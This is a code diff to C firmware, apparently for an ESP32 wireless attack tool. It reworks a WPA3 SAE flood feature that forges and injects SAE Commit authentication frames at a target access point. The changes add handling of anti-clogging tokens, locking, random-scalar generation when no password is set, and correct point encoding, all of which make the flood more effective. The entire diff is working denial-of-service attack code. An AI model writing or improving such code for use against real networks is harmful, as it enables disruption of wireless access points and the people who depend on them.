@@ -39,6 +39,7 @@
 #include <inttypes.h>
 #include "managers/default_portal.h"
 #include "freertos/task.h"
+#include "freertos/portmacro.h"
 #include "mbedtls/ecp.h"
 #include "mbedtls/ctr_drbg.h"
 #include "mbedtls/entropy.h"
@@ -4741,6 +4742,7 @@ typedef struct {
     uint8_t kck[32];
     uint8_t pmk[32];
     uint8_t token[32];
+    uint16_t token_len;
     bool token_required;
     int sync;
     int rc;
@@ -4748,6 +4750,7 @@ typedef struct {
 
 static sae_data_t sae_ctx;
 static bool sae_initialized = false;
+static portMUX_TYPE sae_lock = portMUX_INITIALIZER_UNLOCKED;
 
 // Forward declarations
 static void inject_sae_confirm_frame(void);
@@ -4880,7 +4883,7 @@ static esp_err_t sae_calculate_confirm(sae_data_t *sae, uint16_t send_confirm, u
     if (ret != 0) goto cleanup;
 
     // Extract X coordinate (big-endian, 32 bytes) as K
-    uint8_t k[32];
+    uint8_t k[33];
     size_t olen;
     mbedtls_ecp_point_write_binary(&sae->group, &sae_tmp_point,
                                    MBEDTLS_ECP_PF_COMPRESSED, &olen,
@@ -4943,6 +4946,9 @@ static uint8_t sae_frame_buffer[128];
 
 static void inject_sae_commit_frame(uint8_t* src_mac, int frame_counter) {
     int frame_len = 0;
+    bool token_required_local = false;
+    uint16_t token_len_local = 0;
+    uint8_t token_buf_local[32];
     
     // 802.11 Authentication header
     sae_frame_buffer[0] = 0xb0; sae_frame_buffer[1] = 0x00;  // Frame Control
@@ -4964,10 +4970,18 @@ static void inject_sae_commit_frame(uint8_t* src_mac, int frame_counter) {
     // Group ID = P-256 (19)
     sae_frame_buffer[frame_len++] = 0x13; sae_frame_buffer[frame_len++] = 0x00;
     
-    // Add anti-clogging token if required
-    if (sae_ctx.token_required) {
-        memcpy(sae_frame_buffer + frame_len, sae_ctx.token, 32);
-        frame_len += 32;
+    // Add anti-clogging token if required (variable length)
+    portENTER_CRITICAL(&sae_lock);
+    token_required_local = sae_ctx.token_required;
+    token_len_local = sae_ctx.token_len;
+    if (token_len_local > sizeof(token_buf_local)) token_len_local = sizeof(token_buf_local);
+    if (token_required_local && token_len_local > 0) {
+        memcpy(token_buf_local, sae_ctx.token, token_len_local);
+    }
+    portEXIT_CRITICAL(&sae_lock);
+    if (token_required_local && token_len_local > 0) {
+        memcpy(sae_frame_buffer + frame_len, token_buf_local, token_len_local);
+        frame_len += token_len_local;
     }
     
     // Initialize SAE context if needed
@@ -4977,23 +4991,44 @@ static void inject_sae_commit_frame(uint8_t* src_mac, int frame_counter) {
     esp_wifi_get_mac(WIFI_IF_STA, own_mac);
     
     if (!sae_initialized) {
-        if (sae_init_context(pwd, own_mac, sae_target_bssid, ssid) != ESP_OK) {
-            printf("SAE context initialization failed - pwd:%s ssid:%s\n", 
-                   pwd ? "set" : "null", ssid ? ssid : "null");
-            return;
+        bool inited = false;
+        if (pwd && strlen(pwd) > 0) {
+            if (sae_init_context(pwd, own_mac, sae_target_bssid, ssid) == ESP_OK &&
+                sae_generate_commit(&sae_ctx) == ESP_OK) {
+                inited = true;
+            }
         }
-        if (sae_generate_commit(&sae_ctx) != ESP_OK) {
-            printf("SAE commit generation failed\n");
-            return;
+        if (!inited) {
+            if (!sae_crypto_initialized) {
+                mbedtls_entropy_init(&sae_entropy);
+                mbedtls_ctr_drbg_init(&sae_ctr_drbg);
+                mbedtls_ecp_point_init(&sae_tmp_point);
+                mbedtls_ctr_drbg_seed(&sae_ctr_drbg, mbedtls_entropy_func, &sae_entropy, NULL, 0);
+                sae_crypto_initialized = true;
+            }
+            mbedtls_ecp_group_init(&sae_ctx.group);
+            mbedtls_ecp_point_init(&sae_ctx.own_element);
+            mbedtls_mpi_init(&sae_ctx.own_scalar);
+            if (mbedtls_ecp_group_load(&sae_ctx.group, MBEDTLS_ECP_DP_SECP256R1) != 0) return;
+            mbedtls_mpi_fill_random(&sae_ctx.own_scalar, 32, mbedtls_ctr_drbg_random, &sae_ctr_drbg);
+            mbedtls_mpi_mod_mpi(&sae_ctx.own_scalar, &sae_ctx.own_scalar, &sae_ctx.group.N);
+            if (mbedtls_mpi_cmp_int(&sae_ctx.own_scalar, 0) == 0) mbedtls_mpi_lset(&sae_ctx.own_scalar, 1);
+            if (mbedtls_ecp_mul(&sae_ctx.group, &sae_ctx.own_element, &sae_ctx.own_scalar,
+                                &sae_ctx.group.G, mbedtls_ctr_drbg_random, &sae_ctr_drbg) != 0) return;
         }
+        sae_initialized = true;
     }
     
-    // Write Finite Field Element (32 bytes) - compressed point format
-    size_t element_len;
-    mbedtls_ecp_point_write_binary(&sae_ctx.group, &sae_ctx.own_element,
-                                   MBEDTLS_ECP_PF_COMPRESSED, &element_len, 
-                                   sae_frame_buffer + frame_len, 33);
-    frame_len += 32;  // Skip compression byte, use 32 bytes
+    // Write Element as full 33-byte compressed point
+    size_t element_len = 0;
+    uint8_t element_comp[33];
+    if (mbedtls_ecp_point_write_binary(&sae_ctx.group, &sae_ctx.own_element,
+                                       MBEDTLS_ECP_PF_COMPRESSED, &element_len,
+                                       element_comp, sizeof(element_comp)) != 0 || element_len < 33) {
+        return;
+    }
+    memcpy(sae_frame_buffer + frame_len, element_comp, element_len);
+    frame_len += element_len;
     
     // Write Scalar (32 bytes)
     mbedtls_mpi_write_binary(&sae_ctx.own_scalar, sae_frame_buffer + frame_len, 32);
@@ -5115,6 +5150,11 @@ void wifi_manager_start_sae_flood(void) {
     sae_injection_rate = 100;
     sae_flood_packets_sent = 0;
     sae_flood_running = true;
+    sae_initialized = false;
+    portENTER_CRITICAL(&sae_lock);
+    sae_ctx.token_required = false;
+    sae_ctx.token_len = 0;
+    portEXIT_CRITICAL(&sae_lock);
 
     wifi_manager_start_monitor_mode(sae_monitor_callback);
     esp_wifi_set_channel(sae_target_channel, WIFI_SECOND_CHAN_NONE);
@@ -5247,11 +5287,13 @@ static void sae_monitor_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
     if (auth_seq == 1) {  // SAE Commit response
         if (status_code == 76) {  // Anti-clogging token required
             printf("Anti-clogging token required\n");
+            size_t avail = pkt->rx_ctrl.sig_len > 8 ? (size_t)pkt->rx_ctrl.sig_len - 8 : 0;
+            uint16_t tlen = (avail > 32) ? 32 : (uint16_t)avail;
+            portENTER_CRITICAL(&sae_lock);
             sae_ctx.token_required = true;
-            // Extract token from frame (after group ID)
-            if (pkt->rx_ctrl.sig_len > 32) {
-                memcpy(sae_ctx.token, auth_body + 8, 32);
-            }
+            sae_ctx.token_len = tlen;
+            if (tlen) memcpy(sae_ctx.token, auth_body + 8, tlen);
+            portEXIT_CRITICAL(&sae_lock);
         } else if (status_code == 0) {  // Success - extract peer commit
             printf("SAE Commit accepted, extracting peer data\n");
             // Extract peer element and scalar from response
